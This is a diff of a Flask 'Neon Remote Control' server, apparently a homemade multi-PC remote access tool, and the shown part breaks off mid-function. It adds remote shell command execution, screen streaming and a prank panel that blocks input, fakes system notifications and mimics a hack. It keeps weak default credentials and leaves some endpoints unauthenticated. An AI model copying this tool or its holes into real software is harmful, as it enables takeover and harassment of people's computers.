@@ -1,15 +1,169 @@
+# remote_neon_server.py
+# -*- coding: utf-8 -*-
+"""
+Neon Remote Control v2.0 — Multi-Computer Remote Management System
+Features:
+- Master Server & Client Agent Modes (Multi-PC control)
+- Neon Theme UI with dynamic color switcher
+- Password Authentication, Sessions & User Permissions
+- Real-time System Monitoring, Process Manager, File System, Camera, Remote Desktop, Troll Panel
+"""
+
 import os
-import json
+import sys
+import io
 import time
+import json
+import socket
+import datetime
+import threading
+import subprocess
+import argparse
+import shlex
+import zipfile
+import hmac
+import hashlib
 import base64
-from flask import Flask, render_template_string, request, redirect, session, jsonify, Response
+from functools import wraps
 
+from flask import (Flask, render_template_string, Response, request, redirect,
+                   url_for, session, send_file, flash, jsonify, get_flashed_messages)
+
+# --- App Initialization ---
 app = Flask(__name__)
-app.secret_key = "neon_super_secret_key_change_me"
 
-ADMIN_USERNAME = "admin"
-ADMIN_PASSWORD = "pro"
-USERS_FILE = "users.json"
+# Config & Environment
+ADMIN_USERNAME = "pro"
+ADMIN_PASSWORD = os.environ.get("REMOTE_PASS", "tttt")
+PORT = int(os.environ.get("REMOTE_PORT", 4237))
+SECRET_KEY = os.environ.get("FLASK_SECRET", "arkadiip_secret_key")
+app.secret_key = SECRET_KEY
+SCREEN_DELAY = float(os.environ.get("SCREEN_DELAY", 0.05))
+BASE_DIR = os.getcwd()
+ALLOW_REMOTE_CMD = True
+
+# Storage paths
+APPDATA = os.environ.get("APPDATA") or os.path.join(os.path.expanduser("~"), ".config")
+REMOTE_DATA_DIR = os.path.join(APPDATA, "RemoteNeon")
+USERS_FILE = os.path.join(REMOTE_DATA_DIR, "users.json")
+NOTIFS_FILE = os.path.join(REMOTE_DATA_DIR, "notifications.json")
+MESSAGES_FILE = os.path.join(REMOTE_DATA_DIR, "messages.json")
+CHAT_FILE = os.path.join(REMOTE_DATA_DIR, "chat.json")
+CAMERA_DIR = os.path.join(BASE_DIR, "static", "camera")
+
+os.makedirs(REMOTE_DATA_DIR, exist_ok=True)
+os.makedirs(CAMERA_DIR, exist_ok=True)
+
+# Optional Libraries
+try:
+    import psutil
+    psutil.cpu_percent(None)
+except ImportError:
+    psutil = None
+
+try:
+    from PIL import Image, ImageGrab, ImageFile
+    ImageFile.MAX_IMAGE_PIXELS = None
+except ImportError:
+    Image = ImageGrab = None
+
+try:
+    import cv2
+    CV2_AVAILABLE = True
+except Exception:
+    CV2_AVAILABLE = False
+
+try:
+    import pyautogui
+    PYAUTOGUI_AVAILABLE = True
+    try:
+        pyautogui.FAILSAFE = False
+    except Exception:
+        pass
+except Exception:
+    PYAUTOGUI_AVAILABLE = False
+
+try:
+    import mss
+    MSS_AVAILABLE = True
+except Exception:
+    MSS_AVAILABLE = False
+
+# Windows Specific Libraries
+IS_WINDOWS = os.name == "nt"
+if IS_WINDOWS:
+    import ctypes
+    from ctypes import wintypes, POINTER, cast
+    user32 = ctypes.WinDLL("user32", use_last_error=True)
+    kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)
+    try:
+        import win32gui
+        import win32con
+        import winsound
+        import comtypes
+        from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
+        PYCAW_AVAILABLE = True
+    except Exception:
+        PYCAW_AVAILABLE = False
+else:
+    user32 = None
+    kernel32 = None
+    PYCAW_AVAILABLE = False
+
+# Multi-PC Agent Registry
+AGENTS_LOCK = threading.Lock()
+CONNECTED_AGENTS = {}  # {agent_id: {hostname, ip, os, last_seen, cpu, ram, pending_task: None, last_result: None}}
+
+# Theme Definitions
+THEMES = {
+    "green": {"neon": "#00ffd0", "muted": "#4fbdb1"},
+    "blue": {"neon": "#00c8ff", "muted": "#4fa6bd"},
+    "red": {"neon": "#ff4d4d", "muted": "#bd4f4f"},
+    "purple": {"neon": "#b84dff", "muted": "#9b4fbd"},
+    "yellow": {"neon": "#ffe44d", "muted": "#bdb44f"},
+    "pink": {"neon": "#ff4d9d", "muted": "#bd4f87"},
+    "cyan": {"neon": "#00ffd6", "muted": "#4fbdb1"},
+    "orange": {"neon": "#ff9f4d", "muted": "#bd8a4f"},
+    "mint": {"neon": "#4dffb8", "muted": "#6fbda1"},
+}
+DEFAULT_THEME = "green"
+
+# Trolls / Pranks Definitions
+TROLLS = {
+    "block": {"short": "Блок вводу", "long": "Повністю блокує мишку та клавіатуру на заданий час"},
+    "mouse": {"short": "Миша хаос", "long": "Міняє місцями кнопки миші"},
+    "disco": {"short": "Диско вікон", "long": "Вікна хаотично відкриваються та рухаються"},
+    "beep": {"short": "Системні біпи", "long": "Програє випадкові системні звукові сигнали"},
+    "shake": {"short": "Тряска вікна", "long": "Активне вікно починає різко трястися"},
+    "invert": {"short": "Інверсія", "long": "Інвертує кольори екрана"},
+    "drift": {"short": "Знос миші", "long": "Курсор повільно самовільно відхиляється"},
+    "minall": {"short": "Згорнути все", "long": "Миттєво згортає всі відкриті вікна"},
+    "altab": {"short": "Alt+Tab", "long": "Хаотично перемикає активні вікна"},
+    "notify": {"short": "Фейк повідомлення", "long": "Показує фальшиве системне повідомлення"},
+    "scroll": {"short": "Реверс скролу", "long": "Інвертує напрямок прокрутки"},
+    "type": {"short": "Фейк друк", "long": "Система сама вводить випадковий текст"},
+    "freeze": {"short": "Фріз", "long": "Імітує зависання вікон"},
+    "blink": {"short": "Блимання", "long": "Екран коротко блимає"},
+    "volume": {"short": "Гучність хаос", "long": "Різко змінює рівень системної гучності"},
+    "usb": {"short": "USB звук", "long": "Відтворює звук підключення USB"},
+    "focus": {"short": "Крадіжка фокусу", "long": "Постійно перехоплює фокус активного вікна"},
+    "task": {"short": "Панель задач", "long": "Ховає та показує панель задач Windows"},
+    "cursor": {"short": "Курсор хаос", "long": "Різко змінює позицію курсора"},
+    "almost": {"short": "Майже нічого", "long": "Створює відчуття зламу 😈"}
+}
+
+TROLL_STATE = {k: False for k in TROLLS}
+TROLL_EVENTS = {k: threading.Event() for k in TROLLS}
+PENDING_OTPS = {}
+
+# --- Helper Functions ---
+def login_required(f):
+    @wraps(f)
+    def decorated(*args, **kwargs):
+        if not session.get("logged_in"):
+            return redirect(url_for("login", next=request.path))
+        return f(*args, **kwargs)
+    return decorated
 
 def load_users():
     if not os.path.exists(USERS_FILE):
@@ -17,10 +171,12 @@ def load_users():
             ADMIN_USERNAME: {
                 "password": ADMIN_PASSWORD,
                 "permissions": ["admin", "screen", "files", "commands", "processes", "camera", "network", "remote"],
+                "2fa_enabled": False,
+                "2fa_secret": "",
+                "notify_on": []
             }
         }
-        with open(USERS_FILE, "w", encoding="utf-8") as f:
-            json.dump(users, f, indent=2)
+        save_users(users)
         return users
     try:
         with open(USERS_FILE, "r", encoding="utf-8") as f:
@@ -28,481 +184,374 @@ def load_users():
     except Exception:
         return {}
 
-# --- Стан Агентів (Багато клієнтів) ---
-AGENTS = {}
-COMMAND_QUEUES = {}
+def save_users(users):
+    with open(USERS_FILE, "w", encoding="utf-8") as f:
+        json.dump(users, f, indent=2, ensure_ascii=False)
 
-# --- HTML ШАБЛОНИ ---
-LOGIN_TEMPLATE = r"""
-<!doctype html>
-<html lang="uk">
-<head>
-<meta charset="utf-8">
-<title>Вхід — Neon Remote</title>
-<style>
-@import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&display=swap');
-body{background:#06060b;color:#0ff;font-family:'Inter',Arial;margin:0;display:flex;align-items:center;justify-content:center;height:100vh}
-.box{background:#0b0b12;padding:40px;border-radius:12px;box-shadow:0 0 40px rgba(0,255,208,0.2);width:100%;max-width:380px;border:1px solid rgba(0,255,208,0.3);}
-input{display:block;margin:10px 0 20px 0;padding:14px;border-radius:6px;border:1px solid #00ffd0;background:#071018;color:#0ff;width:100%;box-sizing:border-box;outline:none;}
-button{padding:14px;border-radius:6px;border:1px solid #00ffd0;background:#001a1a;color:#0ff;cursor:pointer;width:100%;font-weight:bold;text-transform:uppercase;transition:0.3s;}
-button:hover{background:#00ffd0;color:#000;}
-.title{font-weight:800;font-size:24px;margin-bottom:20px;text-align:center;letter-spacing:1px;}
-.msg{color:#ff4d4d;margin-bottom:15px;text-align:center;font-size:14px;}
-</style>
-</head>
-<body>
-<div class="box">
-  <div class="title">NEON SYSTEM</div>
-  {% if msg %}<div class="msg">{{ msg }}</div>{% endif %}
-  <form method="POST">
-    <input name="username" placeholder="Логін (admin)" required>
-    <input name="password" type="password" placeholder="Пароль" required>
-    <button type="submit">Увійти</button>
-  </form>
-</div>
-</body>
-</html>
-"""
+def load_notifs():
+    if not os.path.exists(NOTIFS_FILE):
+        return {}
+    try:
+        with open(NOTIFS_FILE, "r", encoding="utf-8") as f:
+            return json.load(f)
+    except Exception:
+        return {}
 
-MAIN_TEMPLATE = r"""
-<!doctype html>
-<html lang="uk">
-<head>
-<meta charset="utf-8">
-<title>Neon Remote — Dashboard</title>
-<style>
-@import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&display=swap');
-:root { --neon: #00ffd0; --bg: #05060d; --panel: rgba(10, 15, 30, 0.6); --border: rgba(255, 255, 255, 0.08); }
-* { box-sizing: border-box; }
-body { margin: 0; background: var(--bg); color: var(--neon); font-family: 'Inter', sans-serif; overflow: hidden; display: flex; height: 100vh; }
+def save_notifs(notifs):
+    with open(NOTIFS_FILE, "w", encoding="utf-8") as f:
+        json.dump(notifs, f, indent=2, ensure_ascii=False)
 
-/* Ліва панель: Список агентів */
-.sidebar { width: 280px; background: rgba(0,0,0,0.92); border-right: 1px solid var(--border); padding: 20px; display: flex; flex-direction: column; z-index: 10; }
-.sidebar h2 { margin-top: 0; font-size: 18px; color: #fff; text-transform: uppercase; border-bottom: 1px solid var(--border); padding-bottom: 15px; }
-.agent-list { flex: 1; overflow-y: auto; display: flex; flex-direction: column; gap: 10px; }
-.agent-item { padding: 12px; border: 1px solid var(--border); border-radius: 8px; cursor: pointer; transition: 0.3s; background: var(--panel); color: #fff; display: flex; justify-content: space-between; align-items: center; }
-.agent-item:hover { border-color: var(--neon); box-shadow: 0 0 10px rgba(0, 255, 208, 0.2); }
-.agent-item.active { background: rgba(0, 255, 208, 0.1); border-color: var(--neon); color: var(--neon); font-weight: bold; }
-.status-dot { width: 10px; height: 10px; border-radius: 50%; background: #ff4d4d; box-shadow: 0 0 8px #ff4d4d; }
-.status-dot.online { background: #00ff66; box-shadow: 0 0 8px #00ff66; }
+def add_notification(target_usernames, title, message):
+    if isinstance(target_usernames, str):
+        target_usernames = [target_usernames]
+    notifs = load_notifs()
+    ts = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    for u in target_usernames:
+        lst = notifs.get(u, [])
+        lst.insert(0, {"ts": ts, "title": title, "message": message})
+        notifs[u] = lst[:200]
+    save_notifs(notifs)
 
-/* Головний контент */
-.main-col { flex: 1; padding: 30px; overflow-y: auto; position: relative; }
-.card { background: var(--panel); border: 1px solid var(--border); border-radius: 16px; padding: 20px; margin-bottom: 20px; backdrop-filter: blur(10px); }
-.card b { display: block; margin-bottom: 15px; font-size: 16px; text-transform: uppercase; color: #fff; }
-.btn { border: 1px solid var(--neon); background: rgba(0,0,0,0.3); color: var(--neon); padding: 10px 16px; border-radius: 10px; cursor: pointer; transition: 0.3s; font-weight: 600; text-decoration: none; display: inline-block; width: 100%; text-align: center; }
-.btn:hover { background: var(--neon); color: #000; box-shadow: 0 0 15px var(--neon); }
+def get_theme_colors(theme_name):
+    theme = THEMES.get(theme_name, THEMES.get(DEFAULT_THEME))
+    return theme["neon"], theme["muted"]
 
-textarea { width: 100%; height: 80px; background: rgba(0,0,0,0.5); color: #fff; border: 1px solid var(--border); border-radius: 10px; padding: 12px; outline: none; font-family: monospace; }
-pre { background: rgba(0,0,0,0.8); padding: 15px; border-radius: 10px; overflow-x: auto; color: #aaa; font-family: monospace; border: 1px solid var(--border); max-height: 250px; }
-img.screen { width: 100%; border-radius: 10px; border: 1px solid var(--border); display: block; min-height: 300px; background: #000; object-fit: contain; }
+def current_ts():
+    return datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
 
-/* Права панель (Виїжджає при наведенні) */
-.right-panel { position: fixed; top: 0; right: -320px; width: 320px; height: 100vh; background: #0f172a; border-left: 1px solid #334155; padding: 20px; transition: right 0.3s ease; z-index: 9999; display: flex; flex-direction: column; overflow-y: auto; }
-.right-panel::before { content: ""; position: absolute; left: -30px; top: 0; width: 30px; height: 100%; }
-.right-panel:hover { right: 0; }
-.stat-header { display: flex; justify-content: space-between; margin-bottom: 8px; font-weight: 600; color: #fff; font-size: 14px; }
-.bar { height: 8px; background: rgba(0,0,0,0.5); border-radius: 4px; overflow: hidden; margin-bottom: 20px; }
-.bar div { height: 100%; width: 0%; background: var(--neon); transition: width 0.3s ease; box-shadow: 0 0 10px var(--neon); }
+def get_system_info():
+    cpu = psutil.cpu_percent(interval=None) if psutil else 0
+    ram = psutil.virtual_memory().percent if psutil else 0
+    return {"cpu_percent": cpu, "ram_percent": ram}
 
-/* Placeholder, коли не вибрано агента */
-.no-agent { display: flex; height: 100%; align-items: center; justify-content: center; color: #888; font-size: 20px; text-transform: uppercase; }
-</style>
-</head>
-<body>
+def show_ips():
+    try:
+        local = socket.gethostbyname(socket.gethostname())
+    except Exception:
+        local = "127.0.0.1"
+    return {"local": local, "public": "LAN-Mode"}
 
-<!-- ЛІВА ПАНЕЛЬ -->
-<div class="sidebar">
-  <div style="display: flex; justify-content: space-between; align-items: center;">
-    <h2>Клієнти</h2>
-    <a href="/logout" style="color:#ff4d4d; font-size:12px; text-decoration:none;">ВИЙТИ</a>
-  </div>
-  <div class="agent-list" id="agentList">
-    <!-- Сюди JS завантажить агентів -->
-  </div>
-</div>
+# Audio Volume Control (Windows pycaw)
+def set_volume(percent: int):
+    if not IS_WINDOWS or not PYCAW_AVAILABLE:
+        return
+    try:
+        percent = max(0, min(100, percent))
+        comtypes.CoInitialize()
+        devices = AudioUtilities.GetSpeakers()
+        interface = devices.Activate(IAudioEndpointVolume._iid_, 23, None)
+        volume = cast(interface, POINTER(IAudioEndpointVolume))
+        volume.SetMasterVolumeLevelScalar(percent / 100.0, None)
+    except Exception:
+        pass
 
-<!-- ГОЛОВНИЙ ЕКРАН -->
-<div class="main-col" id="mainCol">
-  <div class="no-agent">⬅ Виберіть комп'ютер зі списку зліва</div>
-</div>
+def get_volume():
+    if not IS_WINDOWS or not PYCAW_AVAILABLE:
+        return 50
+    try:
+        comtypes.CoInitialize()
+        devices = AudioUtilities.GetSpeakers()
+        interface = devices.Activate(IAudioEndpointVolume._iid_, 23, None)
+        volume = cast(interface, POINTER(IAudioEndpointVolume))
+        return int(volume.GetMasterVolumeLevelScalar() * 100)
+    except Exception:
+        return 50
 
-<!-- ПРАВА ПАНЕЛЬ (статистика і пранки) -->
-<div class="right-panel" id="rightPanel" style="display: none;">
-  <h3 style="color: #fff; margin-top: 0; border-bottom: 1px solid #334155; padding-bottom: 10px;">Панель керування</h3>
-  
-  <div class="stat-header">CPU ПК <span id="cpuVal">0%</span></div>
-  <div class="bar"><div id="cpuBar"></div></div>
+# --- Screen Grabber ---
+def capture_screen():
+    if MSS_AVAILABLE:
+        with mss.mss() as sct:
+            monitor = sct.monitors[1]
+            img = Image.frombytes("RGB", sct.grab(monitor).size, sct.grab(monitor).bgra, "raw", "BGRX")
+            buf = io.BytesIO()
+            img.save(buf, format="JPEG", quality=60)
+            return buf.getvalue()
+    elif ImageGrab:
+        img = ImageGrab.grab()
+        buf = io.BytesIO()
+        img.convert("RGB").save(buf, format="JPEG", quality=60)
+        return buf.getvalue()
+    return b""
 
-  <div class="stat-header">RAM ПК <span id="ramVal">0%</span></div>
-  <div class="bar"><div id="ramBar"></div></div>
+def start_stream_generator():
+    while True:
+        try:
+            frame = capture_screen()
+            yield (b'--frame\r\n'
+                   b'Content-Type: image/jpeg\r\n\r\n' + frame + b'\r\n')
+        except Exception:
+            pass
+        time.sleep(SCREEN_DELAY)
 
-  <div style="margin-bottom: 20px;">
-    <div class="stat-header">Гучність ПК</div>
-    <div style="display:flex; align-items:center; gap:15px;">
-      <input type="range" min="0" max="100" value="50" id="volumeSlider" style="flex:1; cursor:pointer;">
-      <span id="volumeVal" style="font-weight:600; color:#fff;">50%</span>
-    </div>
-  </div>
+# --- Routes ---
 
-  <b style="color: #fff; display: block; margin-bottom: 10px;">Швидкі Пранки</b>
-  <div style="display:grid; grid-template-columns: 1fr 1fr; gap:10px;">
-    <button class="btn" style="font-size:12px;" onclick="sendTroll('beep')">🔊 Beep</button>
-    <button class="btn" style="font-size:12px;" onclick="sendTroll('msg')">💬 Повідомлення</button>
-  </div>
-  
-  <b style="color: #fff; display: block; margin: 20px 0 10px;">Менеджер</b>
-  <button class="btn" onclick="openProcesses()">⚙️ Процеси</button>
-  
-  <div style="margin-top: auto; font-size: 12px; color: #666; text-align: center;">Наведи мишку, щоб відкрити панель</div>
-</div>
-
-<script>
-let currentHwid = null;
-
-// Завантажує список підключених ПК
-async function fetchAgents() {
-  try {
-    const r = await fetch('/api/agents');
-    const agents = await r.json();
-    const list = document.getElementById('agentList');
-    
-    if (agents.length === 0) {
-      list.innerHTML = '<div style="color:#666; font-size:12px; text-align:center;">Немає активних агентів</div>';
-      return;
-    }
-
-    list.innerHTML = agents.map(a => `
-      <div class="agent-item ${currentHwid === a.hwid ? 'active' : ''}" onclick="selectAgent('${a.hwid}')">
-        <span>${a.hostname}</span>
-        <div class="status-dot ${a.online ? 'online' : ''}"></div>
-      </div>
-    `).join('');
-    
-    // Якщо вибраного агента ще немає, вибираємо першого
-    if (!currentHwid && agents.length > 0) {
-      selectAgent(agents[0].hwid);
-    }
-  } catch(e){}
-}
-
-// Вибір конкретного ПК
-function selectAgent(hwid) {
-  currentHwid = hwid;
-  document.getElementById('rightPanel').style.display = 'flex';
-  
-  document.getElementById('mainCol').innerHTML = `
-    <div class="card">
-      <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:15px;">
-        <b style="margin:0;">Екран ПК: ${hwid}</b>
-        <span id="agentStatus" class="status-dot online"></span>
-      </div>
-      <img id="screenImg" src="" class="screen">
-    </div>
-
-    <div class="card">
-      <b>Консоль Команд (CMD / PowerShell)</b>
-      <form id="cmdForm" onsubmit="sendCmd(event)">
-        <textarea id="cmdInput" placeholder="Введіть команду (наприклад: dir або whoami)..."></textarea>
-        <button type="submit" class="btn" style="margin-top:10px; width:auto;">Виконати на ПК</button>
-      </form>
-      <pre id="cmdOutput">Очікування результату...</pre>
-    </div>
-  `;
-  
-  fetchAgents(); // Щоб оновити клас "active" в списку
-}
-
-// Оновлення статистики обраного ПК
-async function updateStats(){
-  if (!currentHwid) return;
-  try {
-    const r = await fetch('/api/system?hwid=' + encodeURIComponent(currentHwid));
-    const d = await r.json();
-    
-    if (d.error) return;
-
-    document.getElementById('cpuBar').style.width = d.cpu + "%";
-    document.getElementById('ramBar').style.width = d.ram + "%";
-    document.getElementById('cpuVal').innerText = d.cpu + "%";
-    document.getElementById('ramVal').innerText = d.ram + "%";
-    
-    const statusEl = document.getElementById('agentStatus');
-    if (statusEl) {
-      statusEl.className = d.online ? "status-dot online" : "status-dot";
-    }
-    
-    if (d.cmd_output && document.getElementById('cmdOutput')) {
-      document.getElementById('cmdOutput').innerText = d.cmd_output;
-    }
-  } catch(e){}
-}
-
-// Оновлення картинки екрана
-function updateScreen() {
-  if (!currentHwid) return;
-  const img = document.getElementById('screenImg');
-  if (img) {
-    img.src = "/api/screen.jpg?hwid=" + encodeURIComponent(currentHwid) + "&t=" + new Date().getTime();
-  }
-}
-
-// Відправка команди
-async function sendCmd(e) {
-  e.preventDefault();
-  if (!currentHwid) return;
-  const cmd = document.getElementById('cmdInput').value;
-  if(!cmd) return;
-  
-  await fetch('/api/run_cmd', {
-    method: 'POST',
-    headers: {'Content-Type': 'application/json'},
-    body: JSON.stringify({ hwid: currentHwid, cmd: cmd })
-  });
-  
-  document.getElementById('cmdInput').value = '';
-  document.getElementById('cmdOutput').innerText = 'Команду відправлено...';
-}
-
-// Гучність
-const volSlider = document.getElementById('volumeSlider');
-if (volSlider) {
-  volSlider.addEventListener('change', () => {
-    if (!currentHwid) return;
-    document.getElementById('volumeVal').innerText = volSlider.value + '%';
-    fetch('/api/volume', {
-      method: 'POST',
-      headers: {'Content-Type': 'application/json'},
-      body: JSON.stringify({ hwid: currentHwid, value: volSlider.value })
-    });
-  });
-}
-
-// Відправка пранку
-function sendTroll(action) {
-  if (!currentHwid) return;
-  fetch('/api/troll', {
-    method: 'POST',
-    headers: {'Content-Type': 'application/json'},
-    body: JSON.stringify({ hwid: currentHwid, action: action })
-  });
-}
-
-// Процеси (тимчасово алерт для спрощення, або можна зробити окрему сторінку)
-function openProcesses() {
-  if (!currentHwid) return;
-  window.location.href = '/processes?hwid=' + encodeURIComponent(currentHwid);
-}
-
-// Цикли оновлення
-setInterval(fetchAgents, 3000);
-setInterval(updateStats, 1500);
-setInterval(updateScreen, 2000);
-fetchAgents(); // Перший запуск
-</script>
-</body>
-</html>
-"""
-
-PROCESSES_TEMPLATE = r"""
-<!DOCTYPE html>
-<html lang="uk">
-<head>
-<meta charset="utf-8">
-<title>Процеси — Neon Remote</title>
-<style>
-@import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap');
-:root { --neon: #00ffd0; --bg: #05060d; --panel: rgba(10, 15, 30, 0.6); --border: rgba(255, 255, 255, 0.08); }
-body { margin: 0; font-family: 'Inter', sans-serif; background: var(--bg); color: var(--neon); padding: 30px; }
-.btn { border: 1px solid var(--neon); background: transparent; color: var(--neon); padding: 8px 16px; border-radius: 10px; cursor: pointer; text-decoration: none; display: inline-block; }
-.card { background: var(--panel); border: 1px solid var(--border); border-radius: 16px; padding: 20px; backdrop-filter: blur(10px); }
-table { width: 100%; border-collapse: collapse; text-align: left; margin-top: 15px; font-size: 14px; }
-th, td { padding: 12px; border-bottom: 1px solid var(--border); color: #ccc; }
-th { color: var(--neon); text-transform: uppercase; }
-.action-btn { background: transparent; border: 1px solid #ff4d4d; color: #ff4d4d; padding: 6px 10px; border-radius: 6px; cursor: pointer; }
-.action-btn:hover { background: #ff4d4d; color: #fff; }
-</style>
-</head>
-<body>
-<a href="/" class="btn" style="margin-bottom: 20px;">⬅ На головну</a>
-<div class="card">
-  <h2>Менеджер процесів ПК: <span id="pcName"></span></h2>
-  <table>
-    <thead><tr><th>PID</th><th>Назва</th><th>Дії</th></tr></thead>
-    <tbody id="plist"><tr><td colspan="3">Завантаження...</td></tr></tbody>
-  </table>
-</div>
-<script>
-const urlParams = new URLSearchParams(window.location.search);
-const currentHwid = urlParams.get('hwid');
-document.getElementById('pcName').innerText = currentHwid;
-
-async function loadProc(){
-  if(!currentHwid) return;
-  const r = await fetch('/api/processes?hwid=' + encodeURIComponent(currentHwid));
-  const data = await r.json();
-  const tbody = document.getElementById('plist');
-  if(data.error || !data.length) { tbody.innerHTML = '<tr><td colspan="3">Немає даних від Агента</td></tr>'; return; }
-  
-  tbody.innerHTML = data.map(p => `
-    <tr>
-      <td>${p.pid}</td>
-      <td style="color:#fff;">${p.name}</td>
-      <td><button class="action-btn" onclick="killProc(${p.pid})">❌ Завершити</button></td>
-    </tr>
-  `).join('');
-}
-
-function killProc(pid){
-  fetch('/api/process/kill', {
-    method: 'POST',
-    headers: {'Content-Type': 'application/json'},
-    body: JSON.stringify({ hwid: currentHwid, pid: pid })
-  }).then(() => setTimeout(loadProc, 1000));
-}
-
-loadProc();
-</script>
-</body>
-</html>
-"""
-
-# --- WEB ROUTES ---
-@app.route('/login', methods=['GET', 'POST'])
+@app.route("/login", methods=["GET", "POST"])
 def login():
-    if request.method == 'POST':
-        users = load_users()
-        u = request.form.get('username')
-        p = request.form.get('password')
-        if u in users and users[u]['password'] == p:
-            session['user'] = u
-            return redirect('/')
-        return render_template_string(LOGIN_TEMPLATE, msg="Невірний логін або пароль")
-    return render_template_string(LOGIN_TEMPLATE)
+    users = load_users()
+    msg = ""
+    if request.method == "POST":
+        username = request.form.get("username", "").strip()
+        pw = request.form.get("password", "")
+        user = users.get(username)
+        if user and user.get("password") == pw:
+            session["logged_in"] = True
+            session["username"] = username
+            add_notification([ADMIN_USERNAME], "Вхід у систему", f"Користувач {username} увійшов о {current_ts()}")
+            return redirect(url_for("index"))
+        else:
+            msg = "Невірний логін або пароль"
+    return render_template_string(LOGIN_TEMPLATE, msg=msg)
 
-@app.route('/logout')
+@app.route("/logout")
 def logout():
-    session.pop('user', None)
-    return redirect('/login')
+    session.clear()
+    return redirect(url_for("login"))
 
-@app.route('/')
-def main():
-    if 'user' not in session: return redirect('/login')
-    return render_template_string(MAIN_TEMPLATE)
+@app.route("/")
+@login_required
+def index():
+    info = show_ips()
+    sysinfo = get_system_info()
+    username = session.get("username")
+    users = load_users()
+    user_perms = users.get(username, {}).get("permissions", [])
+    theme = session.get('theme', DEFAULT_THEME)
+    neon, muted = get_theme_colors(theme)
+    cmd_output = session.pop("last_cmd_output", None)
 
-@app.route('/processes')
-def processes_page():
-    if 'user' not in session: return redirect('/login')
-    return render_template_string(PROCESSES_TEMPLATE)
+    with AGENTS_LOCK:
+        agents_count = len(CONNECTED_AGENTS)
 
-# --- CLIENT API ENDPOINTS (Для Веб-Інтерфейсу) ---
-@app.route('/api/agents')
-def api_agents():
-    now = time.time()
-    res = []
-    for hwid, data in AGENTS.items():
-        is_online = (now - data['last_seen']) < 10
-        res.append({
-            'hwid': hwid,
-            'hostname': data.get('hostname', hwid),
-            'online': is_online
-        })
-    return jsonify(res)
+    return render_template_string(
+        MAIN_TEMPLATE,
+        cpu=sysinfo["cpu_percent"],
+        ram=sysinfo["ram_percent"],
+        local_ip=info["local"],
+        username=username,
+        permissions=user_perms,
+        theme=theme,
+        neon=neon,
+        muted=muted,
+        cmd_output=cmd_output,
+        agents_count=agents_count,
+        themes_list=sorted(THEMES.keys()),
+        TROLLS=TROLLS
+    )
 
-@app.route('/api/system')
+@app.route("/screen_feed")
+@login_required
+def screen_feed():
+    return Response(start_stream_generator(), mimetype='multipart/x-mixed-replace; boundary=frame')
+
+@app.route("/api/system")
 def api_system():
-    hwid = request.args.get('hwid')
-    if not hwid or hwid not in AGENTS: return jsonify({'error': 'Agent not found'})
-    agent = AGENTS[hwid]
-    online = (time.time() - agent['last_seen']) < 10
-    return jsonify({
-        'cpu': agent.get('cpu', 0),
-        'ram': agent.get('ram', 0),
-        'online': online,
-        'cmd_output': agent.get('cmd_output', 'Очікування команд...')
-    })
+    sysinfo = get_system_info()
+    return jsonify(sysinfo)
 
-@app.route('/api/screen.jpg')
-def api_screen():
-    hwid = request.args.get('hwid')
-    if hwid in AGENTS and AGENTS[hwid].get('screenshot'):
-        return Response(AGENTS[hwid]['screenshot'], mimetype='image/jpeg')
-    return Response(b'', mimetype='image/jpeg')
-
-@app.route('/api/run_cmd', methods=['POST'])
-def api_run_cmd():
-    hwid = request.json.get('hwid')
-    cmd = request.json.get('cmd')
-    if hwid and cmd:
-        if hwid not in COMMAND_QUEUES: COMMAND_QUEUES[hwid] = []
-        COMMAND_QUEUES[hwid].append({'type': 'cmd', 'payload': cmd})
-    return jsonify({'status': 'queued'})
-
-@app.route('/api/volume', methods=['POST'])
+@app.route("/api/volume", methods=["GET", "POST"])
+@login_required
 def api_volume():
-    hwid = request.json.get('hwid')
-    val = request.json.get('value')
-    if hwid and val is not None:
-        if hwid not in COMMAND_QUEUES: COMMAND_QUEUES[hwid] = []
-        COMMAND_QUEUES[hwid].append({'type': 'volume', 'payload': val})
-    return jsonify({'status': 'queued'})
+    if request.method == "POST":
+        data = request.get_json(force=True) or {}
+        set_volume(int(data.get("value", 50)))
+        return {"ok": True}
+    return {"value": get_volume()}
 
-@app.route('/api/troll', methods=['POST'])
-def api_troll():
-    hwid = request.json.get('hwid')
-    action = request.json.get('action')
-    if hwid and action:
-        if hwid not in COMMAND_QUEUES: COMMAND_QUEUES[hwid] = []
-        COMMAND_QUEUES[hwid].append({'type': 'troll', 'payload': action})
-    return jsonify({'status': 'queued'})
+@app.route("/run_cmd", methods=["POST"])
+@login_required
+def run_cmd():
+    cmd = request.form.get("cmd", "")
+    if not cmd:
+        return redirect(url_for("index"))
+    try:
+        res = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=15)
+        out = (res.stdout or "") + (res.stderr or "")
+    except Exception as e:
+        out = str(e)
+    session["last_cmd_output"] = out
+    return redirect(url_for("index"))
 
-@app.route('/api/processes')
+# --- Multi-PC Management API & Page ---
+@app.route("/agents")
+@login_required
+def agents_page():
+    theme = session.get('theme', DEFAULT_THEME)
+    neon, muted = get_theme_colors(theme)
+    with AGENTS_LOCK:
+        agents = list(CONNECTED_AGENTS.values())
+    return render_template_string(AGENTS_TEMPLATE, agents=agents, neon=neon, muted=muted)
+
+@app.route("/api/agent/register", methods=["POST"])
+def agent_register():
+    data = request.get_json(force=True) or {}
+    agent_id = data.get("agent_id")
+    if not agent_id:
+        return jsonify({"error": "missing agent_id"}), 400
+    
+    with AGENTS_LOCK:
+        CONNECTED_AGENTS[agent_id] = {
+            "id": agent_id,
+            "hostname": data.get("hostname", "Unknown"),
+            "ip": request.remote_addr,
+            "os": data.get("os", "Unknown"),
+            "cpu": data.get("cpu", 0),
+            "ram": data.get("ram", 0),
+            "last_seen": current_ts(),
+            "pending_cmd": None,
+            "last_result": None
+        }
+    return jsonify({"status": "registered"})
+
+@app.route("/api/agent/heartbeat", methods=["POST"])
+def agent_heartbeat():
+    data = request.get_json(force=True) or {}
+    agent_id = data.get("agent_id")
+    if not agent_id:
+        return jsonify({"error": "missing agent_id"}), 400
+
+    with AGENTS_LOCK:
+        if agent_id in CONNECTED_AGENTS:
+            CONNECTED_AGENTS[agent_id]["last_seen"] = current_ts()
